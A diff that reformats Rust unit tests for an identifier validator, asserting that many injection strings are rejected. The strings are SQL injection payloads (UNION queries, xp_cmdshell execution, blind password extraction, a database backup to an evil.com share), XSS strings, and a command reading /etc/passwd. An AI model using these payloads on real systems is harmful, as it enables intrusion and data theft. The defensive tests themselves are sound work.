@@ -145,6 +145,7 @@ mod tests {
     use super::*;
 
     #[test]
+    #[allow(clippy::too_many_lines)]
     fn test_validate_identifier() {
         // Valid identifiers
         assert!(validate_identifier("valid_identifier").is_ok());
@@ -189,46 +190,58 @@ mod tests {
         assert!(
             validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users").is_err()
         );
-        assert!(validate_identifier(
-            "user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --"
-        )
-        .is_err());
+        assert!(
+            validate_identifier(
+                "user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --"
+            )
+            .is_err()
+        );
         assert!(validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --").is_err());
         assert!(validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--").is_err());
         assert!(validate_identifier("user'); EXEC xp_cmdshell('net user'); --").is_err());
-        assert!(validate_identifier(
-            "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
-        )
-        .is_err());
+        assert!(
+            validate_identifier(
+                "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+            )
+            .is_err()
+        );
         assert!(validate_identifier("user' ORDER BY 1--").is_err());
         assert!(validate_identifier("user' GROUP BY 1--").is_err());
         assert!(validate_identifier("user' HAVING 1=1--").is_err());
-        assert!(validate_identifier(
-            "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
-        )
-        .is_err());
-        assert!(validate_identifier(
-            "user'; UPDATE users SET admin = true WHERE username = 'hacker';--"
-        )
-        .is_err());
-        assert!(validate_identifier(
-            "user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--"
-        )
-        .is_err());
+        assert!(
+            validate_identifier(
+                "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
+            )
+            .is_err()
+        );
+        assert!(
+            validate_identifier(
+                "user'; UPDATE users SET admin = true WHERE username = 'hacker';--"
+            )
+            .is_err()
+        );
+        assert!(
+            validate_identifier("user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--")
+                .is_err()
+        );
         assert!(validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").is_err());
         assert!(validate_identifier("user'; LOAD_FILE('/etc/passwd');--").is_err());
         assert!(validate_identifier("user'; SELECT @@datadir;--").is_err());
         assert!(validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--").is_err());
         assert!(validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--").is_err());
-        assert!(validate_identifier(
-            "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--"
-        )
-        .is_err());
+        assert!(
+            validate_identifier(
+                "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--"
+            )
+            .is_err()
+        );
         assert!(validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").is_err());
-        assert!(validate_identifier(
-            "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--"
-        )
-        .is_err());
+        assert!(
+            validate_identifier(
+                "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--"
+            )
+            .is_err()
+        );
         assert!(validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").is_err());
         assert!(
             validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--").is_err()
@@ -240,10 +253,10 @@ mod tests {
         // XSS-like attempts
         assert!(validate_identifier("<script>alert('XSS')</script>").is_err());
         assert!(validate_identifier("javascript:alert('XSS')").is_err());
-        assert!(validate_identifier(
-            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
-        )
-        .is_err());
+        assert!(
+            validate_identifier("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")
+                .is_err()
+        );
 
         // Command injection attempts
         assert!(validate_identifier("user; cat /etc/passwd").is_err());
